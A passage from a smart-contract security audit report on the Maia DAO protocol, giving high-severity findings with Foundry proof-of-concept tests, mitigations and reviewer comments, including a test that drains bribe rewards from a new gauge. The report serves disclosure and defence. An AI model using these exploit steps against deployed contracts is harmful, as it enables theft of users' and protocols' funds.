All of this is possible, becauseendCycleis not initialized insideFlywheelAcummulatedRewardswhen first created:
https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/rewards/FlywheelAcummulatedRewards.sol#L26-L35
abstractcontractFlywheelAcummulatedRewardsisBaseFlywheelRewards,IFlywheelAcummulatedRewards{usingSafeCastLibforuint256;/*//////////////////////////////////////////////////////////////REWARDS CONTRACT STATE//////////////////////////////////////////////////////////////*//// @inheritdoc IFlywheelAcummulatedRewardsuint256publicimmutableoverriderewardsCycleLength;/// @inheritdoc IFlywheelAcummulatedRewardsuint256publicoverrideendCycle;// NOTE INITIALIZED INSIDE CONSTRUCTOR/***@noticeFlywheel Instant Rewards constructor.*@param_flywheelflywheel core contract*@param_rewardsCycleLengththe length of a rewards cycle in seconds*/constructor(FlywheelCore_flywheel,uint256_rewardsCycleLength)BaseFlywheelRewards(_flywheel) {rewardsCycleLength=_rewardsCycleLength;}...}
So right after it is created and attached to the gauge, the distribution of rewards can be called immediately viaaccrueBribesinside the gauge. If no previous user put their gauge tokens into this gauge contract, rewards can easily drained.
Foundry PoC (add this test insideBaseV2GaugeTest.t.sol):
functiontestAccrueAndClaimBribesAbuse()external{addressalice=address(0xABCD);MockERC20token=newMockERC20("test token","TKN",18);FlywheelCoreflywheel=createFlywheel(token);FlywheelBribeRewardsbribeRewards=FlywheelBribeRewards(address(flywheel.flywheelRewards()));gaugeToken.setMaxDelegates(1);token.mint(address(depot),100ether);// ALICE SEE THAT THIS IS NEW GAUGE, about to add new NEW FLYWHEEL REWARDS// alice put a lot of his hermes or could also get from flash loanhermes.mint(alice,100e18);hevm.startPrank(alice);hermes.approve(address(gaugeToken),100e18);gaugeToken.mint(alice,100e18);gaugeToken.delegate(alice);gaugeToken.incrementGauge(address(gauge),100e18);console.log("hermes total supply");console.log(hermes.totalSupply());hevm.stopPrank();// NEW BRIBE FLYWHEEL IS ADDEDhevm.expectEmit(true,true,true,true);emitAddedBribeFlywheel(flywheel);gauge.addBribeFlywheel(flywheel);// ALICE ACCRUE BRIBESgauge.accrueBribes(alice);console.log("bribe rewards balance before claim : ");console.log(token.balanceOf(address(bribeRewards)));flywheel.claimRewards(alice);console.log("bribe rewards balance after claim : ");console.log(token.balanceOf(address(bribeRewards)));console.log("alice rewards balance : ");console.log(token.balanceOf(alice));// after steal reward, alice could just disengage from the gauge, and look for another new gauge with new flywheelhevm.startPrank(alice);gaugeToken.decrementGauge(address(gauge),100e18);hevm.stopPrank();}
PoC log output:
bribe rewards balance before claim :100000000000000000000bribe rewards balance after claim :0alice rewards balance :100000000000000000000
Recommended Mitigation Steps
Add initializedendCycleinsideFlywheelAcummulatedRewards:
constructor(FlywheelCore_flywheel,uint256_rewardsCycleLength)BaseFlywheelRewards(_flywheel) {rewardsCycleLength=_rewardsCycleLength;endCycle= ((block.timestamp.toUint32() +rewardsCycleLength) /rewardsCycleLength) *rewardsCycleLength;}
Trust (judge) decreased severity to Medium
0xLightt (Maia) confirmed and commented:
The mitigation should take into account the following issue#457. So the best solution would be to check ifendCycleis zero. If it is, then zero rewards are accrued andendCycleis set to end of the epoch.
Trust (judge) increased severity to High and commented:
Upon second viewing, it seems the attack is in line with High severity.
0xLightt (Maia) commented:
Addressedhere.

[H-30] Incorrect flow of adding liquidity inUlyssesRouter.sol
Submitted byT1MOH, also found bybin2chen
Usually the router inAMMis stateless, i.e. it isn’t supposed to contain any tokens, it is just a wrapper of low-level pool functions to perform user-friendly interactions. The current implementation ofaddLiquidity()assumes that a user firstly transfers tokens to the router and then the router performs the deposit to the pool. However, it is not atomic and requires two transactions. Another user can break in after the first transaction and deposit someone else’s tokens.
Proof of Concept
The router calls the deposit withmsg.senderas a receiver of shares:
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesRouter.sol#L49-L56
functionaddLiquidity(uint256amount,uint256minOutput,uint256poolId)externalreturns(uint256) {UlyssesPoolulysses=getUlyssesLP(poolId);amount=ulysses.deposit(amount,msg.sender);if(amount<minOutput)revertOutputTooLow();returnamount;}
And in deposit pool transfer tokens frommsg.sender, which is the router:
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-4626/UlyssesERC4626.sol#L34-L45
functiondeposit(uint256assets,addressreceiver)publicvirtualnonReentrantreturns(uint256shares) {// Need to transfer before minting or ERC777s could reenter.asset.safeTransferFrom(msg.sender,address(this),assets);shares=beforeDeposit(assets);require(shares!=0,"ZERO_SHARES");_mint(receiver,shares);emitDeposit(msg.sender,receiver,assets,shares);}
First, a user will lose tokens sent to the router, if a malicious user callsaddLiquidity()after it.
Recommended Mitigation Steps
Transfer tokens to the router viasafeTransferFrom():
functionaddLiquidity(uint256amount,uint256minOutput,uint256poolId)externalreturns(uint256) {UlyssesPoolulysses=getUlyssesLP(poolId);address(ulysses.asset()).safeTransferFrom(msg.sender,address(this),amount);amount=ulysses.deposit(amount,msg.sender);if(amount<minOutput)revertOutputTooLow();returnamount;}
Assessed type
Access Control
0xLightt (Maia) confirmed
0xLightt (Maia) commented:
We recognize the audit’s findings on Ulysses AMM. These will not be rectified due to the upcoming migration of this section to Balancer Stable Pools.

[H-31] On Ulysses omnichain -RetrieveDepositmight never be able to trigger theFallbackfunction
Submitted byzzebra83, also found byxuwinnie
The purpose of theretrieveDepositfunction is to enable a user to be able to redeem a deposit they entered into the system. The mechanism works based on the promise that this function will be able to forcefully make the root bridge agent trigger thefallbackfunction.
if (!executionHistory[fromChainId][uint32(bytes4(data[1:5]))]) {//Toggle Nonce as executedexecutionHistory[fromChainId][nonce] = true;//Retry failed fallback(success, result) = (false, "")
By returning false, theanycallcontract will attempt to trigger thefallbackfunction in the branch bridge, which would in turn set the status of the deposit as failed. The user can then redeem their deposit because its status is now failed.
function redeemDeposit(uint32 _depositNonce) external lock {//Update Depositif (getDeposit[_depositNonce].status != DepositStatus.Failed) {revert DepositRedeemUnavailable();}
The problem is, according to how theanycallprotocol works, it is completely feasible that the execution in the root bridge completes successfully, but thefallbackin the branch might still fail to execute.
uint256 internal constant MIN_FALLBACK_RESERVE = 185_000; // 100_000 for anycall + 85_000 fallback execution overhead
For example, theanycallto the root bridge might succeed due to enough gas stipend, while thefallbackexecution fails due to a low gas stipend.
If this is the case, then the deposit nonce would be stored in theexecutionHistoryduring the initial call, so when theretrievedepositcall is made, it would think that the transaction is already completed, which would trigger this block instead:
_forceRevert();//Return true to avoid triggering anyFallback in case of `_forceRevert()` failurereturn (true, "already executed tx");
The impact of this, is that if the deposit transaction is recorded in the root side as completed. A user will never be able to use theretrievedepositfunction to redeem their deposit from the system.
Proof of Concept
function testRetrieveDeposit() public {//Set uptestAddLocalTokenArbitrum();//Prepare databytes memory packedData;{Multicall2.Call[] memory calls = new Multicall2.Call[](1);//Mock actioncalls[0] = Multicall2.Call({target: 0x0000000000000000000000000000000000000000, callData:   ""});//Output ParamsOutputParams memory outputParams = OutputParams(address(this), newAvaxAssetGlobalAddress, 150 ether, 0);//RLP Encode Calldata Call with no gas to bridge out and we top up.bytes memory data = abi.encode(calls, outputParams, ftmChainId);//Pack FuncIdpackedData = abi.encodePacked(bytes1(0x02), data);}address _user = address(this);//Get some gas.hevm.deal(_user, 100 ether);hevm.deal(address(ftmPort), 1 ether);//assure there is enough balance for mock actionhevm.prank(address(rootPort));ERC20hTokenRoot(newAvaxAssetGlobalAddress).mint(address(rootPort), 50 ether, rootChainId);hevm.prank(address(avaxPort));ERC20hTokenBranch(avaxMockAssethToken).mint(_user, 50 ether);//Mint Underlying Token.avaxMockAssetToken.mint(_user, 100 ether);//Prepare deposit info//Prepare deposit infoDepositParams memory depositParams = DepositParams({hToken: address(avaxMockAssethToken),token: address(avaxMockAssetToken),amount: 150 ether,deposit: 100 ether,toChain: ftmChainId,depositNonce: 1,depositedGas: 1 ether});DepositInput memory depositInput = DepositInput({hToken: address(avaxMockAssethToken),token: address(avaxMockAssetToken),amount: 150 ether,deposit: 100 ether,toChain: ftmChainId});// Encode AnyFallback messagebytes memory anyFallbackData = abi.encodePacked(bytes1(0x01),depositParams.depositNonce,depositParams.hToken,depositParams.token,depositParams.amount,depositParams.deposit,depositParams.toChain,bytes("testdata"),depositParams.depositedGas,depositParams.depositedGas / 2);console2.log("BALANCE BEFORE:");console2.log("User avaxMockAssetToken Balance:", MockERC20(avaxMockAssetToken).balanceOf(_user));console2.log("User avaxMockAssethToken Balance:",  MockERC20(avaxMockAssethToken).balanceOf(_user));require(avaxMockAssetToken.balanceOf(address(avaxPort)) == 0, "balance of port is not zero");//Call Deposit functionavaxMockAssetToken.approve(address(avaxPort), 100 ether);ERC20hTokenRoot(avaxMockAssethToken).approve(address(avaxPort), 50 ether);avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 50 ether}(packedData, depositInput, 0.5 ether);;avaxMulticallBridgeAgent.retrieveDeposit{value: 1 ether}(depositParams.depositNonce);// fallback is not triggered.// @audit Redeem Deposit, will fail with   DepositRedeemUnavailable()avaxMulticallBridgeAgent.redeemDeposit(depositParams.depositNonce);}
Recommended Mitigation Steps
Make the root bridge return(false, ""), regardless of whether the transaction linked to the original deposit was completed or not.
/// DEPOSIT FLAG: 8 (retrieveDeposit)else if (flag == 0x08) {(success, result) = (false, "");
To avoid also spamming the usage of theretrievedepositfunction, it is advisable to add a check in theretrieveDepositfunction to see whether the deposit still exists. It doesn’t make sense to try and retrieve a deposit that has already been redeemed.
function retrieveDeposit(uint32 _depositNonce) external payable lock requiresFallbackGas {address depositOwner = getDeposit[_depositNonce].owner;if (depositOwner == address(0)) {revert RetrieveDepositUnavailable();}
0xBugsy (Maia) confirmed and commented:
This is true, but the mitigation would introduce a race condition allowing users to redeem and retry the same deposit. As such, we will introduce aredemptionHistoryin the root, allowing deposits with redemption and execution set to true to be re-retrieved forfallbackbut not executed again in the root.
0xBugsy (Maia) commented:
For further context, the issue that is being described is that in some cases a retrieve may fail on the branch, due to a lack of gas for branch execution. At that point, the deposit the would have been given has been executed in the root blocking re-retrieval of said deposit.CallingretryDepositshould only be allowed until the first successfulanyFallbackis triggered andretrieveDepositshould always be callable.In addition, in your example when executing the initial request that fails, we should always set theexecutionHistoryto true since afallbackwill be in fact triggered (avoids double spending). But we should also set the deposit as retrievable, via a mapping (or save a uint8 instead of bool for deposit state). And when runninganyExecutein Root for a deposit retrieval, we simply check if the deposit is retrievable; meaning the deposit has never run successfully without triggeringanyFallback.In short, the retry, retrieve and redeem pattern works as expected. But in order to accommodate for off-cases like the one described in this issue,retrieveDepositshould be callable indefinite times for a deposit that never executed successfully in the root, since whenever the deposit is redeemed from the branch it will be deleted.
0xLightt (Maia) commented:
Addressedhere.

[H-32] Incorrectly reading the offset from the received data parameter to get thedepositNoncein theBranchBridgeAgent::anyFallback()function
Submitted by0xStalin
Not reading the correct offset where thedepositNonceis located can lead to setting the status of the wrong deposit to “Failed” when the_clearDeposit() functionis called.
The consequences of setting the incorrectdepositNonceto False can be:
The deposits are getting stuck from the realdepositNoncethat is sent to theanyFallback()because thatdepositNoncewon’t be marked as “Failed”.Causing troubles to otherdepositNoncesthat should not be marked as “Failed”.
Proof of Concept
The structure of the data was encoded depending on the type of operation. That means, thedepositNoncewill be located at a different offset depending on the flag. To see where exactly thedepositNonceis located, it is required to check the corresponding operation where the data was packed. Depending on the type of operation (flag), it will be the function we’ll need to analyze to determine the correct offset where thedepositNoncewas packed.
Let’s analyze the encoded data, flag by flag, to determine the correct offset of thedepositNoncefor each flag:
flag == 0x00- Whenencoding the data for the flag 0x00, we can see that thedepositNonceis located at thedata[1:5].
bytesmemorypackedData=abi.encodePacked(bytes1(0x00),depositNonce,_params,gasToBridgeOut,_remoteExecutionGas);// data[0]    ==> flag === 0x00// data[1:5]  ==> depositNonce
flag == 0x01- Whenencoding the data for the flag 0x01, we can see that thedepositNonceis located at thedata[1:5].
bytesmemorypackedData=abi.encodePacked(bytes1(0x01),depositNonce,_params,_gasToBridgeOut,_remoteExecutionGas);// data[0]    ==> flag === 0x01// data[1:5]  ==> depositNonce
flag == 0x02- Whenencoding the data for the flag 0x02, we can see that thedepositNonceis located at thedata[1:5].
bytesmemorypackedData=abi.encodePacked(bytes1(0x02),depositNonce,_dParams.hToken,_dParams.token,_dParams.amount,_normalizeDecimals(_dParams.deposit,ERC20(_dParams.token).decimals()),_dParams.toChain,_params,_gasToBridgeOut,_remoteExecutionGas);// data[0]    ==> flag === 0x02// data[1:5]  ==> depositNonce
flag == 0x03- Whenencoding the data for the flag 0x03, we can see that thedepositNonceis located at thedata[2:6].
bytesmemorypackedData=abi.encodePacked(bytes1(0x03),uint8(_dParams.hTokens.length),depositNonce,_dParams.hTokens,_dParams.tokens,_dParams.amounts,deposits,_dParams.toChain,_params,_gasToBridgeOut,_remoteExecutionGas);// data[0]    ==> flag === 0x03// data[1]    ==> hTones.length// data[2:6]  ==> depositNonce
flag == 0x04- Whenencoding the data for the flag 0x04, we can see that thedepositNonceis located at thedata[21:25].
bytesmemorypackedData=abi.encodePacked(bytes1(0x04),msg.sender,depositNonce,_params,msg.value.toUint128(),_remoteExecutionGas);// data[0]    ==> flag === 0x04// data[1:21] ==> msg.sender// data[21:25]  ==> depositNonce
flag == 0x05- Whenencoding the data for the flag 0x05, we can see that thedepositNonceis located at thedata[21:25].
bytesmemorypackedData=abi.encodePacked(bytes1(0x05),msg.sender,depositNonce,_dParams.hToken,_dParams.token,_dParams.amount,_normalizeDecimals(_dParams.deposit,ERC20(_dParams.token).decimals()),_dParams.toChain,_params,msg.value.toUint128(),_remoteExecutionGas);// data[0]    ==> flag === 0x05// data[1:21] ==> msg.sender// data[21:25]  ==> depositNonce
flag == 0x06- Whenencoding the data for the flag 0x06, we can see that thedepositNonceis located at thedata[22:26].
bytesmemorypackedData=abi.encodePacked(bytes1(0x06),msg.sender,uint8(_dParams.hTokens.length),depositNonce,_dParams.hTokens,_dParams.tokens,_dParams.amounts,_deposits,_dParams.toChain,_params,msg.value.toUint128(),_remoteExecutionGas);// data[0]     ==> flag === 0x06// data[1:21]  ==> msg.sender// data[21]    ==> hTokens.length// data[22:26] ==> depositNonce
At this point now, we know the exact offset where thedepositNonceis located at for all the possible deposit options. Now, it is time to analyze the offsets that are been read, depending on the flag in theanyFallback()and validate that the correct offset is been read.
Forflags 0x00, 0x01 and 0x02, thedepositNonceis been read from the offsetdata[PARAMS_START:PARAMS_TKN_START], which is the same asdata[1:5](PARAMS_START == 1andPARAMSTKNSTART == 5). These 3 flags read thedepositNoncecorrectly.Forflag 0x03, thedepositNonceis been read from the offsetdata[PARAMS_START + PARAMS_START:PARAMS_TKN_START + PARAMS_START], which is the same asdata[2:6](PARAMS_START == 1andPARAMSTKNSTART == 5). This flag also reads thedepositNoncecorrectly.Forflag 0x04 and 0x05, thedepositNonceis been read from the offsetdata[PARAMS_START_SIGNED:PARAMS_START_SIGNED + PARAMS_TKN_START], which is the same asdata[21:26](PARAMSSTARTSIGNED == 21andPARAMSTKNSTART == 5). These flags are reading thedepositNonceINCORRECTLY.
From the above analysis to detect where thedepositNonceis located at, forflags 0x04 and 0x05, thedepositNonceis located at the offsetdata[21:25].
The PoC below demonstrates the correct offset of thedepositNoncewhen data is encoded similar to howflags 0x04 and 0x05encodes it (see the above analysis for more details).
Call thegenerateData()function and copy+paste the generated bytes on the rest of the functions.Notice how thereadNonce()returns the correct value of the nonce and is reading the offsetdata[21:25]:
pragmasolidity0.8.18;contractoffset{uint32nonce=3;functiongenerateData()externalviewreturns(bytesmemory) {bytesmemorypackedData=abi.encodePacked(bytes1(0x01),msg.sender,nonce);returnpackedData;}functionreadFlag(bytescalldatadata)externalviewreturns(bytes1) {returndata[0];}functionreadMsgSender(bytescalldatadata)externalviewreturns(address) {returnaddress(uint160(bytes20(data[1:21])));}functionreadNonce(bytescalldatadata)externalviewreturns(uint32) {returnuint32(bytes4(data[21:25]));}}
Forflag 0x06, thedepositNonceis been read from the offsetdata[PARAMS_START_SIGNED + PARAMS_START:PARAMS_START_SIGNED + PARAMS_TKN_START + PARAMS_START], which is the same asdata[22:27](PARAMSSTARTSIGNED == 21,PARAMS_START == 1andPARAMSTKNSTART == 5). This flag is also reading thedepositNonceINCORRECTLY.
From the above analysis to detect where thedepositNonceis located at, forflag 0x06, thedepositNonceis located at the offsetdata[22:26].
The PoC below demonstrates the correct offset of thedepositNoncewhen data is encoded similar to howflag 0x06encodes it (see the above analysis for more details).
Call thegenerateData()function and copy+paste the generated bytes on the rest of the functions.Notice how thereadNonce()returns the correct value of the nonce and is reading the offsetdata[22:26]:
pragmasolidity0.8.18;contractoffset{uint32nonce=3;functiongenerateData()externalviewreturns(bytesmemory) {bytesmemorypackedData=abi.encodePacked(bytes1(0x01),msg.sender,uint8(1),nonce);returnpackedData;}functionreadFlag(bytescalldatadata)externalviewreturns(bytes1) {returndata[0];}functionreadMsgSender(bytescalldatadata)externalviewreturns(address) {returnaddress(uint160(bytes20(data[1:21])));}functionreadThirdParameter(bytescalldatadata)externalviewreturns(uint8) {returnuint8(bytes1(data[21]));}functionreadNonce(bytescalldatadata)externalviewreturns(uint32) {returnuint32(bytes4(data[22:26]));}}
Recommended Mitigation Steps
Make sure to read thedepositNoncefrom the correct offset. Depending on the flag, it will be the offset wheredepositNonceis located at:
Forflags 0x04 & 0x05, read the offset as follows, either of the two options are correct:
depositNonceis located at:data[21:25]
_depositNonce=uint32(bytes4(data[PARAMS_START_SIGNED:PARAMS_START_SIGNED]));_depositNonce=uint32(bytes4(data[21:25]));
Forflag 0x06, read the offset as follows, either of the two options are correct:
depositNonceis located at:data[22:26]
_depositNonce=uint32(bytes4(data[PARAMS_START_SIGNED+PARAMS_START:PARAMS_START_SIGNED+PARAMS_TKN_START]));_depositNonce=uint32(bytes4(data[22:26]));
Assessed type
en/de-code
0xBugsy (Maia) confirmed
0xLightt (Maia) commented:
Addressedhere.

[H-33]BaseV2MinterDAO reward shares are calculated wrong
Submitted byABA
InBaseV2Minter, when calculating the DAO shares out of the weekly emissions, the current implementation wrongly takes into consideration the extrabHERMESgrowth tokens (to the locked); thus, is allocating a larger value than intended. This also has an indirect effect on the increasing protocol inflation ifHERMESneeds to be minted in order to reach the required token amount.
Issue details
Token DAO shares (sharevariable) is calculated inBaseV2Minter::updatePeriodas such:
https://github.com/code-423n4/2023-05-maia/blob/main/src/hermes/minters/BaseV2Minter.sol#L133-L137
uint256_growth=calculateGrowth(newWeeklyEmission);uint256_required=_growth+newWeeklyEmission;/// @dev share of newWeeklyEmission emissions sent to DAO.uint256share= (_required*daoShare) /base;_required+=share;
We actually do see that the original developer intention (confirmed by the sponsor) was that the share value to be calculated is relative tonewWeeklyEmission, not to (_required = newWeeklyEmission + _growth).
/// @dev share of newWeeklyEmission emissions sent to DAO.
Also, it isdocumented that DAO shares should be calculated as part of weekly emissions:
Up to 30% of weekly emissions can be allocated to the DAO.
Proof of Concept
DAO shares value is not calculated relative tonewWeeklyEmission.
https://github.com/code-423n4/2023-05-maia/blob/main/src/hermes/minters/BaseV2Minter.sol#L134-L136
Recommended Mitigation Steps
Change the implementation to reflect intention.
diff --git a/src/hermes/minters/BaseV2Minter.sol b/src/hermes/minters/BaseV2Minter.solindex 7d7f013..217a028 100644--- a/src/hermes/minters/BaseV2Minter.sol+++ b/src/hermes/minters/BaseV2Minter.sol@@ -133,7 +133,7 @@ contract BaseV2Minter is Ownable, IBaseV2Minter {uint256 _growth = calculateGrowth(newWeeklyEmission);uint256 _required = _growth + newWeeklyEmission;/// @dev share of newWeeklyEmission emissions sent to DAO.-            uint256 share = (_required * daoShare) / base;+            uint256 share = (newWeeklyEmission * daoShare) / base;_required += share;uint256 _balanceOf = underlying.balanceOf(address(this));if (_balanceOf < _required) {
0xLightt (Maia) confirmed
alexxander (warden) commented:
Even though the share is bigger than what it is supposed to be, the extra funds are given to the DAO. There is no clear High impact here, please consider Medium severity.
Trust (judge) commented:
Assuming the bug goes unnoticed for some period of time, which is fair, this would cause inflation and decrease value for holders. Therefore, high is justified.
0xLightt (Maia) commented:
Addressedhere.

[H-34] Cross-chain messaging viaAnycallwill fail
Submitted byltyu, also found byyellowBirdy,RED-LOTUS-REACH,Koolex,BPZ, andxuwinnie
Lines of code
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L1006-L1011https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/lib/AnycallFlags.sol#L11
Impact
Cross-chain calls will fail since source-fee is not supplied toAnycall.
Proof of Concept
In_performCall()ofBranchBridgeAgent.sol, a cross-chain call is made usinganyCall()with the_flagof4. According to theAnycall V7 documentationandcode, when using gas_flagof 4, the gas fee must be paid on the source chain. This meansanyCall()must be called and sent gas.
However, this is not the case, and the result of_performCallwill always revert. This will impact many functions that rely on this function; such ascallOut(),callOutSigned(),retryDeposit(), etc.
Recommended Mitigation Steps
After discussing with the Sponsor, it is expected that the fee be paid on the destination chain, specificallyrootBridgeAgent. Consider refactoring the code to change the_flagto usepay on destination.
Alternatively, if pay on source is the intention, consider refactoring the code to include fees; starting with_performCall. Additional refactoring will be required.
function _performCall(bytes memory _calldata, uint256 _fee) internal virtual {//Sends message to AnycallProxyIAnycallProxy(local`AnyCall`Address).anyCall{value: _fee}(rootBridgeAgentAddress, _calldata, rootChainId, AnycallFlags.FLAG_ALLOW_FALLBACK, "");}
Assessed type
Library
0xBugsy (Maia) confirmed and commented:
We recognize the audit’s findings on Anycall. These will not be rectified due to the upcoming migration of this section to LayerZero.

[H-35]Rerange/rebalanceshould not useprotocolFeeas an asset for adding liquidity
Submitted byT1MOH, also found bylukejohn,bin2chen,said,los_chicos,SpicyMeatball, andmax10afternoon
The account ofprotocolFeeis broken because tokens ofprotocolFee0andprotocolFee1are used while rerange/rebalance are used to add liquidity. At the same time, the variablesprotocolFee0andprotocolFee1are not updated and the de-facto contract doesn’t haveprotocolFeeon balance.
Proof of Concept
Functionrerangeis used both inrerangeand inrebalance:
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/strategies/TalosStrategySimple.sol#L30-L46
functiondoRerange()internaloverridereturns(uint256amount0,uint256amount1) {(tickLower,tickUpper,amount0,amount1,tokenId,liquidity) =nonfungiblePositionManager.rerange(PoolActions.ActionParams(pool,optimizer,token0,token1,tickSpacing),poolFee);}functiondoRebalance()internaloverridereturns(uint256amount0,uint256amount1) {int24baseThreshold=tickSpacing*optimizer.tickRangeMultiplier();PoolActions.ActionParamsmemoryactionParams=PoolActions.ActionParams(pool,optimizer,token0,token1,tickSpacing);PoolActions.swapToEqualAmounts(actionParams,baseThreshold);(tickLower,tickUpper,amount0,amount1,tokenId,liquidity) =nonfungiblePositionManager.rerange(actionParams,poolFee);}
Let’s have a look at this function. This function callsgetThisPositionTicksto get the amounts ofbalance0andbalance1of tokens toaddLiquidity:
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/libraries/PoolActions.sol#L56-L88
functionrerange(INonfungiblePositionManagernonfungiblePositionManager,ActionParamsmemoryactionParams,uint24poolFee)internalreturns(int24tickLower,int24tickUpper,uint256amount0,uint256amount1,uint256tokenId,uint128liquidity){int24baseThreshold=actionParams.tickSpacing*actionParams.optimizer.tickRangeMultiplier();uint256balance0;uint256balance1;(balance0,balance1,tickLower,tickUpper) =getThisPositionTicks(actionParams.pool,actionParams.token0,actionParams.token1,baseThreshold,actionParams.tickSpacing);emitSnapshot(balance0,balance1);(tokenId,liquidity,amount0,amount1) =nonfungiblePositionManager.mint(INonfungiblePositionManager.MintParams({token0:address(actionParams.token0),token1:address(actionParams.token1),amount0Desired:balance0,amount1Desired:balance1,...}));}
The mistake is in the functiongetThisPositionTicks()because it returns the actual token balance of theStrategycontract:
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/libraries/PoolActions.sol#L90-L103
functiongetThisPositionTicks(IUniswapV3Poolpool,ERC20token0,ERC20token1,int24baseThreshold,int24tickSpacing)privateviewreturns(uint256balance0,uint256balance1,int24tickLower,int24tickUpper) {// Emit snapshot to record balancesbalance0=token0.balanceOf(address(this));balance1=token1.balanceOf(address(this));//Get exact ticks depending on Optimizer's balances(tickLower,tickUpper) =pool.getPositionTicks(balance0,balance1,baseThreshold,tickSpacing);}
This returns the actual balance which consists of 2 parts:protocolFeeand users’ funds.Rerangemust use users’ funds, but notprotocolFee.
Suppose the following scenario:
A user has added 1000 tokens of liquidity.This liquidity generated 100 tokens of fee, 50 of which isprotocolFee.Rerangeis called. After removing liquidity contract, they have a 1000 + 100 tokens balance. And the contract adds liquidity of whole balances - 1100 tokens.FunctioncollectFeedoesn’t work because the actual balance is less than the withdrawing amount and the protocol loses profit.
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/base/TalosBaseStrategy.sol#L394-L415
functioncollectProtocolFees(uint256amount0,uint256amount1)externalnonReentrantonlyOwner{uint256_protocolFees0=protocolFees0;uint256_protocolFees1=protocolFees1;if(amount0>_protocolFees0) {revertToken0AmountIsBiggerThanProtocolFees();}if(amount1>_protocolFees1) {revertToken1AmountIsBiggerThanProtocolFees();}ERC20_token0=token0;ERC20_token1=token1;uint256balance0=_token0.balanceOf(address(this));uint256balance1=_token1.balanceOf(address(this));require(balance0>=amount0&&balance1>=amount1);if(amount0>0)_token0.transfer(msg.sender,amount0);if(amount1>0)_token1.transfer(msg.sender,amount1);protocolFees0=_protocolFees0-amount0;protocolFees1=_protocolFees1-amount1;emitRewardPaid(msg.sender,amount0,amount1);}
Recommended Mitigation Steps
I suggest using a different address forprotocolFee. Transfer allprotocolFeetokens away from this contract to not mix it with users’ assets. Create a contract likeProtocolFeeReceiver.soland make a force transfer of tokens whenStrategygets fee.
Also a note - that in the forked parent project,SorbettoFragola, it is implemented viaburnExactLiquidity.
https://github.com/Popsicle-Finance/SorbettoFragola/blob/9fb31b74f19005d86a78abc758553e7914e7ba49/SorbettoFragola.sol#L458-L483
Assessed type
Math
0xLightt (Maia) confirmed
0xLightt (Maia) commented:
Addressedhere.

